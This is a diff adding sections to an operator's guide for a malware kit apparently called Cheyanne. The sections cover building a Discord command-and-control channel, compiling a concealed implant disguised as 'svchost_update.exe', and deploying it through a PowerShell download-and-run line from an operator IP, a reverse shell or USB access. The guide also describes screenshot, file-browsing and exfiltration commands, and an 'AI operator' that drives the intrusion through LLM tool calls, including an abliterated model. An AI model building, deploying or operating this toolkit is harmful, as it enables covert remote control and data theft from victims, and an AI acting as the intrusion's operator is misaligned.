@@ -1128,3 +1128,149 @@ Reassemble:
 VADER ROOTKIT — Build from Ashes
 "The hunt never ends."
 ```
+
+---
+
+## 11. CHEYANNE — Discord C2 Infrastructure
+
+### Prerequisites (additional)
+
+| # | Tool | Why |
+|---|------|-----|
+| 1 | **PyInstaller** | Compile Python implant to standalone .exe |
+| 2 | **Discord Bot** | Create bot at discord.com/developers, get Bot Token |
+| 3 | **Discord Webhook** | Create webhook in your C2 channel |
+| 4 | **Ollama** (optional) | Local LLM for HANDLER agent |
+
+```cmd
+pip install pyinstaller
+:: Ollama: https://ollama.ai — pull any model:
+ollama pull mistral-nemo
+```
+
+### Discord Setup
+
+1. Create a Discord server (private)
+2. Create a `#c2` text channel
+3. **Webhook:** Channel Settings → Integrations → Webhooks → New → Copy URL
+4. **Bot:** discord.com/developers → New App → Bot → Copy Token → Enable MESSAGE CONTENT intent
+5. **Invite bot** to your server with Read/Send Messages permission
+6. **Get Channel ID:** Enable Developer Mode → Right-click #c2 → Copy Channel ID
+
+### Configure Implant
+
+Edit `agent/discord_implant.py` lines 1-5:
+```python
+WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR/WEBHOOK"
+BOT_TOKEN = "YOUR_BOT_TOKEN"
+CHANNEL_ID = "YOUR_CHANNEL_ID"
+C2_HOST = "YOUR_IP"     # for TCP reverse shell
+C2_PORT = 4443
+```
+
+### Build Discord Implant
+
+```cmd
+:: From cheyanne root:
+cd agent
+pyinstaller --onefile --noconsole discord_implant.py
+:: Output: agent/dist_py/svchost_update.exe (~9.4MB)
+```
+
+Or via menu: `python vader_menu.py` → `[B]`
+
+### Deploy to Target
+
+**Option 1 — Auto Deploy (menu [A]):**
+Compiles, serves HTTP, waits for reverse shell, pushes implant, takes screenshot. All automated.
+
+**Option 2 — Manual via TCP shell:**
+```cmd
+:: On operator: start C2 shell
+python vader_menu.py → [D]
+
+:: On target shell (chey> prompt):
+powershell -c "Invoke-WebRequest -Uri 'http://OPERATOR_IP:8890/svchost_update.exe' -OutFile 'C:\Users\Public\svchost_update.exe'; Start-Process 'C:\Users\Public\svchost_update.exe'"
+```
+
+**Option 3 — USB/physical access:**
+Copy `svchost_update.exe` to target, execute.
+
+### Operate via Discord
+
+After implant is running, use Phase 4 menu or HANDLER:
+
+```cmd
+:: Menu
+python vader_menu.py
+[S]  → list sessions
+[T]  → screenshot
+[L]  → browse files
+[E]  → exfil file
+[N]  → recon
+
+:: HANDLER (AI operator)
+python vader_menu.py → [H]
+"take a screenshot"
+"list files on the desktop"
+"what's running on the target"
+"pull that file"
+```
+
+### Backup Procedure
+
+The encrypted 7z backup contains the entire project including source, docs, evidence, and compiled binaries.
+
+```cmd
+:: Create encrypted backup with header encryption
+7z a -p668340 -mhe=on "cheyanne-FULL-YYYYMMDD.7z" "C:\Users\gwu07\Desktop\cheyanne\*" -xr!.git -xr!__pycache__ -xr!*.pyc -xr!build -xr!dist
+
+:: Backup locations:
+:: Desktop: C:\Users\gwu07\Desktop\cheyanne-FULL-YYYYMMDD.7z
+:: Hidden:  C:\Users\gwu07\.cheyanne\cheyanne-FULL-YYYYMMDD.7z
+```
+
+**Archive password: `668340`** — encrypted headers (filenames hidden).
+
+---
+
+## 12. HANDLER — AI-Powered C2 Operator
+
+### Standalone Launch
+
+```cmd
+:: Default (Ollama backend)
+python cheyanne_agent.py
+
+:: Claude API backend
+set ANTHROPIC_API_KEY=sk-ant-...
+python cheyanne_agent.py --claude
+```
+
+### Ollama Model Requirements
+
+Any model works — HANDLER uses prompt-based tool calling (not native tool API). Tested models:
+- `mistral-nemo` (abliterated) — works, slower tool parsing
+- `llama3.1:8b` — good tool compliance
+- `qwen2.5-coder` — fast, good at structured output
+
+If Ollama is on LAN (not localhost), it auto-detects by trying 127.0.0.1, LAN IP, localhost.
+
+### Adding New Tools
+
+Edit `cheyanne_agent.py`:
+1. Add tool to `TOOLS_SCHEMA` list (name + description + parameters)
+2. Add case to `exec_tool()` function
+3. Tool auto-appears in HANDLER's capabilities
+
+### Tool Execution Flow
+
+```
+User input → LLM generates response with <tool> blocks
+  → regex parser extracts tool calls
+  → exec_tool() dispatches to cheyanne_ops functions
+  → results fed back to LLM as "Tool results:" message
+  → LLM analyzes results, may call more tools (up to 3 rounds)
+  → Final text response displayed to operator
+```
+```
